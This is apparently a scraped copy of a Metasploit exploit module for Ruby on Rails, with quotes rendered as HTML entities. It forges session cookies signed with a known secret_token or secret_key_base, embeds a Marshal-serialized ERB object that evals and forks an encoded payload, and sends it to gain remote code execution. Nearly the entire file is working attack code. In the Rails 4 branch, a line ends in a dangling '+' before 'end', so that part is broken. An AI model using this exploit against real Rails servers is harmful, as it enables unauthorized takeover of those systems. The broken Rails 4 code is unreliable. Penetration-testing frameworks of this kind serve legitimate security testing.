# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  #Helper Classes copy/paste from Rails4
  class MessageVerifier

    class InvalidSignature < StandardError; end

    def initialize(secret, options = {})
      @secret = secret
      @digest = options[:digest] || &#039;SHA1&#039;
      @serializer = options[:serializer] || Marshal
    end

    def generate(value)
      data = ::Base64.strict_encode64(@serializer.dump(value))
      "#{data}--#{generate_digest(data)}"
    end

    def generate_digest(data)
      require &#039;openssl&#039; unless defined?(OpenSSL)
      OpenSSL::HMAC.hexdigest(OpenSSL::Digest.const_get(@digest).new, @secret, data)
    end

  end

  class MessageEncryptor

    module NullSerializer #:nodoc:

      def self.load(value)
        value
      end

      def self.dump(value)
        value
      end

    end

    class InvalidMessage < StandardError; end

    OpenSSLCipherError = OpenSSL::Cipher::CipherError

    def initialize(secret, *signature_key_or_options)
      options = signature_key_or_options.extract_options!
      sign_secret = signature_key_or_options.first
      @secret = secret
      @sign_secret = sign_secret
      @cipher = options[:cipher] || &#039;aes-256-cbc&#039;
      @verifier = MessageVerifier.new(@sign_secret || @secret, :serializer => NullSerializer)
      # @serializer = options[:serializer] || Marshal
    end

    def encrypt_and_sign(value)
      @verifier.generate(_encrypt(value))
    end

    def _encrypt(value)
      cipher = new_cipher
      cipher.encrypt
      cipher.key = @secret
      # Rely on OpenSSL for the initialization vector
      iv = cipher.random_iv
      #encrypted_data = cipher.update(@serializer.dump(value))
      encrypted_data = cipher.update(value)
      encrypted_data << cipher.final
      [encrypted_data, iv].map {|v| ::Base64.strict_encode64(v)}.join("--")
    end

    def new_cipher
      OpenSSL::Cipher::Cipher.new(@cipher)
    end

  end

  class KeyGenerator

    def initialize(secret, options = {})
      @secret = secret
      @iterations = options[:iterations] || 2**16
    end

    def generate_key(salt, key_size=64)
      OpenSSL::PKCS5.pbkdf2_hmac_sha1(@secret, salt, @iterations, key_size)
    end

  end

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Ruby on Rails Known Secret Session Cookie Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
          This module implements Remote Command Execution on Ruby on Rails applications.
          Prerequisite is knowledge of the "secret_token" (Rails 2/3) or "secret_key_base"
          (Rails 4). The values for those can be usually found in the file
          "RAILS_ROOT/config/initializers/secret_token.rb". The module achieves RCE by
          deserialization of a crafted Ruby Object.
      },
      &#039;Author&#039;         =>
        [
          &#039;joernchen of Phenoelit <joernchen[at]phenoelit.de>&#039;,
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [&#039;URL&#039;, &#039;https://charlie.bz/blog/rails-3.2.10-remote-code-execution&#039;], #Initial exploit vector was taken from here
          [&#039;URL&#039;, &#039;http://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/&#039;]
        ],
      &#039;DisclosureDate&#039; => &#039;Apr 11 2013&#039;,
      &#039;Platform&#039;       => &#039;ruby&#039;,
      &#039;Arch&#039;           => ARCH_RUBY,
      &#039;Privileged&#039;     => false,
      &#039;Targets&#039;        =>  [ [&#039;Automatic&#039;, {} ] ],
      &#039;DefaultTarget&#039; => 0))

    register_options(
      [
        Opt::RPORT(80),
        OptInt.new(&#039;RAILSVERSION&#039;, [ true, &#039;The target Rails Version (use 3 for Rails3 and 2, 4 for Rails4)&#039;, 3]),
        OptString.new(&#039;TARGETURI&#039;, [ true, &#039;The path to a vulnerable Ruby on Rails application&#039;, "/"]),
        OptString.new(&#039;HTTP_METHOD&#039;, [ true, &#039;The HTTP request method (GET, POST, PUT typically work)&#039;, "GET"]),
        OptString.new(&#039;SECRET&#039;, [ true, &#039;The secret_token (Rails3) or secret_key_base (Rails4) of the application (needed to sign the cookie)&#039;, nil]),
        OptString.new(&#039;COOKIE_NAME&#039;, [ false, &#039;The name of the session cookie&#039;,nil]),
        OptString.new(&#039;DIGEST_NAME&#039;, [ true, &#039;The digest type used to HMAC the session cookie&#039;,&#039;SHA1&#039;]),
        OptString.new(&#039;SALTENC&#039;, [ true, &#039;The encrypted cookie salt&#039;, &#039;encrypted cookie&#039;]),
        OptString.new(&#039;SALTSIG&#039;, [ true, &#039;The signed encrypted cookie salt&#039;, &#039;signed encrypted cookie&#039;]),
        OptBool.new(&#039;VALIDATE_COOKIE&#039;, [ false, &#039;Only send the payload if the session cookie is validated&#039;, true]),

      ], self.class)
  end


  #
  # This stub ensures that the payload runs outside of the Rails process
  # Otherwise, the session can be killed on timeout
  #
  def detached_payload_stub(code)
  %Q^
    code = &#039;#{ Rex::Text.encode_base64(code) }&#039;.unpack("m0").first
    if RUBY_PLATFORM =~ /mswin|mingw|win32/
      inp = IO.popen("ruby", "wb") rescue nil
      if inp
        inp.write(code)
        inp.close
      end
    else
      Kernel.fork do
        eval(code)
      end
    end
    {}
  ^.strip.split(/\n/).map{|line| line.strip}.join("\n")
  end

  def check_secret(data, digest)
    data = Rex::Text.uri_decode(data)
    if datastore[&#039;RAILSVERSION&#039;] == 3
      sigkey = datastore[&#039;SECRET&#039;]
    elsif datastore[&#039;RAILSVERSION&#039;] == 4
      keygen = KeyGenerator.new(datastore[&#039;SECRET&#039;],{:iterations => 1000})
      sigkey = keygen.generate_key(datastore[&#039;SALTSIG&#039;])
    end
    digest == OpenSSL::HMAC.hexdigest(OpenSSL::Digest::Digest.new(datastore[&#039;DIGEST_NAME&#039;]), sigkey, data)
  end

  def rails_4
    keygen = KeyGenerator.new(datastore[&#039;SECRET&#039;],{:iterations => 1000})
    enckey = keygen.generate_key(datastore[&#039;SALTENC&#039;])
    sigkey = keygen.generate_key(datastore[&#039;SALTSIG&#039;])
    crypter = MessageEncryptor.new(enckey, sigkey)
    crypter.encrypt_and_sign(build_cookie)
  end

  def rails_3
    # Sign it with the secret_token
    data = build_cookie
    digest = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::Digest.new("SHA1"), datastore[&#039;SECRET&#039;], data)
    marshal_payload = Rex::Text.uri_encode(data)
    "#{marshal_payload}--#{digest}"
  end

  def build_cookie

    # Embed the payload with the detached stub
    code =
      "eval(&#039;" +
      Rex::Text.encode_base64(detached_payload_stub(payload.encoded)) +
      "&#039;.unpack(&#039;m0&#039;).first)"

    if datastore[&#039;RAILSVERSION&#039;] == 4
      return "\x04\b" +
        ":\x0E@instanceo" +
          ":\bERB\x06" +
            ":\t@src"+  Marshal.dump(code)[2..-1] +
        ":\f@method:\vresult:" +
    end
    if datastore[&#039;RAILSVERSION&#039;] == 3
      return Rex::Text.encode_base64 "\x04\x08" +
        ":\x0E@instance" +
          "o"+":\x08ERB"+"\x06" +
            ":\x09@src" +
              Marshal.dump(code)[2..-1] +
        ":\x0C@method"+":\x0Bresult"
    end
  end

  #
  # Send the actual request
  #
  def exploit
    if datastore[&#039;RAILSVERSION&#039;] == 3
      cookie = rails_3
    elsif datastore[&#039;RAILSVERSION&#039;] == 4
      cookie = rails_4
    end
    cookie_name = datastore[&#039;COOKIE_NAME&#039;]

    print_status("Checking for cookie #{datastore[&#039;COOKIE_NAME&#039;]}")
    res = send_request_cgi({
      &#039;uri&#039;    => datastore[&#039;TARGETURI&#039;] || "/",
      &#039;method&#039; => datastore[&#039;HTTP_METHOD&#039;],
    }, 25)
    if res && res.headers[&#039;Set-Cookie&#039;]
      match = res.headers[&#039;Set-Cookie&#039;].match(/([_A-Za-z0-9]+)=([A-Za-z0-9%]*)--([0-9A-Fa-f]+); /)
    end

    if match
      if match[1] == datastore[&#039;COOKIE_NAME&#039;]
        print_status("Found cookie, now checking for proper SECRET")
      else
        print_status("Adjusting cookie name to #{match[1]}")
        cookie_name = match[1]
      end

      if check_secret(match[2],match[3])
        print_good("SECRET matches! Sending exploit payload")
      else
        fail_with(Exploit::Failure::BadConfig, "SECRET does not match")
      end
    else
      print_warning("Caution: Cookie not found, maybe you need to adjust TARGETURI")
      if cookie_name.nil? || cookie_name.empty?
        fail_with(Exploit::Failure::BadConfig, "No cookie found and no name given")
      end
      if datastore[&#039;VALIDATE_COOKIE&#039;]
        fail_with(Exploit::Failure::BadConfig, "COOKIE not validated, unset VALIDATE_COOKIE to send the payload anyway")
      else
        print_status("Trying to leverage default controller without cookie confirmation.")
      end
    end

    print_status "Sending cookie #{cookie_name}"
    res = send_request_cgi({
      &#039;uri&#039;     => datastore[&#039;TARGETURI&#039;] || "/",
      &#039;method&#039;  => datastore[&#039;HTTP_METHOD&#039;],
      &#039;headers&#039; => {&#039;Cookie&#039; => cookie_name+"="+ cookie},
    }, 25)

    handler
  end

end

